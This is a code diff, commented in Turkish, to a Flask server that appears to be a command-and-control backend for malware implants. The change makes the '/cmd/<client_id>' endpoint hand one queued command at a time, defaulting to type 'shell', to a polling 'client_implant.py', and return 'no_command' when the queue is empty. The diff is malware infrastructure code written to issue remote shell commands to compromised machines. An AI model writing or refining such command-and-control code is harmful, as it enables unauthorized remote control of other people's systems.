@@ -68,12 +68,23 @@ def receive_data():
 
 @app.route('/cmd/<client_id>', methods=['GET'])
 def get_commands(client_id):
+    """İstemci için komut getir - İSTEMCİ UYUMLU VERSİYON"""
     with client_lock:
-        if client_id in pending_commands:
-            commands = pending_commands[client_id].copy()
-            pending_commands[client_id].clear()
-            return jsonify({"commands": commands})
-    return jsonify({"commands": []})
+        if client_id in pending_commands and pending_commands[client_id]:
+            # İlk komutu al ve kuyruktan çıkar
+            command = pending_commands[client_id].pop(0)
+            
+            # İstemcinin beklediği formata dönüştür
+            # client_implant.py "command" anahtarını arıyor
+            return jsonify({
+                "command": {
+                    "type": command.get("type", "shell"),
+                    "data": command.get("data", "")
+                }
+            })
+    
+    # İstemci "no_command" bekliyor (client_implant.py kontrol ediyor)
+    return jsonify({"status": "no_command"})
 
 @app.route('/cmd', methods=['POST'])
 def send_command():
